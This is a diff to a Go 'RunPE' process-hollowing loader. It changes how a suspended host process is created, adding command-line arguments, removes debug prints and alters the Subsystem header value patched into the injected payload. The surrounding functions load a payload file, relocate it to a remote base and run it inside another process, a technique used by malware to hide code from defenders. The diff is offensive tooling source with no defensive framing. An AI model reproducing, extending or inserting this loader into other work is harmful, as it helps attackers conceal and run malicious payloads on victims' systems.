@@ -1,4 +1,4 @@
-package RUNPE
+package main
 
 /*
 #include <string.h>
@@ -668,7 +668,7 @@ func IsTargetCompatible(
 }
 
 //CreateSuspendedProcess func
-func CreateSuspendedProcess(path string, pi *syscall.ProcessInformation) bool {
+func CreateSuspendedProcess(path string, pi *syscall.ProcessInformation,arguments string) bool {
 	var si syscall.StartupInfo
 	siSize := unsafe.Sizeof(syscall.StartupInfo{})
 	Memset(
@@ -680,8 +680,8 @@ func CreateSuspendedProcess(path string, pi *syscall.ProcessInformation) bool {
 		unsafe.Pointer(pi), 0, int(piSize))
 
 	if err := syscall.CreateProcess(
-		nil,
 		syscall.StringToUTF16Ptr(path),
+		syscall.StringToUTF16Ptr(path+" "+arguments),
 		nil,
 		nil,
 		false,
@@ -707,7 +707,6 @@ func LoadFile(fileName string, readSize *uint64) uintptr {
 		syscall.FILE_ATTRIBUTE_NORMAL,
 		0,
 	)
-	fmt.Println(file)
 	if err != nil {
 		log.Println("Error CreateFile: !", err.Error())
 	}
@@ -721,7 +720,6 @@ func LoadFile(fileName string, readSize *uint64) uintptr {
 		syscall.CloseHandle(file)
 		return 0
 	}
-	fmt.Println(mapping)
 	dllRawData, err := syscall.MapViewOfFile(mapping, syscall.FILE_MAP_READ, 0, 0, 0)
 	if err != nil {
 		log.Println("Error MapViewOfFile: !", err.Error())
@@ -1084,11 +1082,11 @@ func _RunPE(
 		if is64b {
 			payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(payloadNTHdr)
 			fmt.Println(string(payloadNTHdr64.OptionalHeader.Subsystem)+"X64");
-			inh.OptionalHeader.Subsystem = 1
+			inh.OptionalHeader.Subsystem = 2
 		} else {
 			payloadNTHdr32 := (*IMAGE_NT_HEADERS)(payloadNTHdr)
 			fmt.Println(string(payloadNTHdr32.OptionalHeader.Subsystem)+"X32");
-			inh.OptionalHeader.Subsystem = 1
+			inh.OptionalHeader.Subsystem = 2
 		}
 	//2. Relocate the payload (local copy) to the Remote Base:
 	if !RelocateModule(loadedPE, payloadImageSize, remoteBase, 0) {
